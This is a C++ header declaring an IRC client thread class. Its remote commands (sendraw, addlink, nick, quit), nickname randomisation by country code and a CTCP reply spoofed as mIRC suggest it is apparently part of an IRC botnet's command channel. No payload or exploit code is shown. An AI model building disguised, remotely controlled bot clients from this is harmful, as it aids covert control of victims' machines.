#pragma once

#include <windows.h>
#include "thread.h"
#include "socketwrapper.h"
#include "config.h"
#include "sel.h"
#include "wildcard.h"
#include "rand.h"
#include "debug.h"
#include "sysinfo.h"
#include "childimage.h"

#define IRC_CTCP_VERSION "mIRC v6.17 Khaled Mardam-Bey" // Version reply when someone ctcp versions
#define IRC_QUIT_MESSAGE_LOGOFF "Logging Off" // Quit message displayed when the user logs off
#define IRC_QUIT_MESSAGE_SHUTDOWN "Shutting Down" // Quit message displayed when the user shuts down
#define IRC_CONNECTION_RETRIES 3 // Retry attempts on a server
#define IRC_RECONNECT_TIMES 5 // Times irc will reconnect when connection is closed
#define IRC_QUIT_COMMAND "quit:" // Causes the irc client to end
#define IRC_NICK_COMMAND "nick:" // Changes nick value and sends nick
#define IRC_ADDLINK_COMMAND "addlink:" // Adds a link to the link cache
#define IRC_NOTIFY_COMMAND "notify:" // notify:#channel  notify:nick  notify:OFF
#define IRC_RAW_PREFIX "sendraw:" //sendraw:PRIVMSG name :hi

// Nick character substitution guide
 // # Number from 0-9
 // < Lowercase letter from a-z
 // > Uppercase letter from A-Z
 // + Number from 0-9 or uppercase letter A-Z
 // * Number from 0-9 or letter a-Z
 // ~ Vowel a,e,i,o,u
 // &cn Replaces with iso 3166 country code

class IRC;

class IRCList
{
public:
	VOID Add(IRC* IRC);
	VOID Remove(IRC* IRC);
	VOID Notify(PCHAR Message);
	VOID QuitAll(PCHAR Message);

private:
	std::vector<IRC*> IRCL;
};

extern class IRCList IRCList;

class IRC : public Thread
{
public:
	IRC(PCHAR Host, USHORT Port, PCHAR Join, PCHAR Nick, PCHAR Ident, PCHAR Name, PCHAR Allow);
	~IRC();
	DWORD		Connect(PCHAR Host, USHORT Port);
	VOID		Notify(PCHAR Message);
	VOID		Quit(PCHAR Message);

private:
	VOID		ThreadFunc(VOID);
	PCHAR		ProcessString(const PCHAR String, PCHAR StringP);

	BOOL		Active;
	BOOL		Connected;
	BOOL		LoginSent;
	BOOL		Quiting;
	CHAR		Host[256];
	USHORT		Port;
	CHAR		Join[64];
	CHAR		Nick[32];
	CHAR		NickP[32];
	CHAR		Ident[32];
	CHAR		IdentP[32];
	CHAR		Name[64];
	CHAR		NameP[64];
	CHAR		Allow[256];
	CHAR		NotifyC[256];
	BOOL		NotifyOn;
	UINT		ConnectionTries;
	UINT		Reconnections;
	Socket		Socket;
	ReceiveBuffer RecvBuf;
	::Socket	IdentSocket;
};